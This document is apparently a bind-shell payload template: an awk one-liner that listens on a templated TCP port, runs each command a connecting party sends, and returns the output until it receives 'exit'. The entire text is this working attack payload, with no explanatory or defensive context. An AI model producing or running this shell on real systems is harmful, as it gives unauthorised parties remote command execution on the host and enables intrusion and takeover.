BEGIN{s="/inet/tcp/{{ LPORT }}/0/0";do{if((s|&getline c)<=0)break;if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!="exit");close(s)}
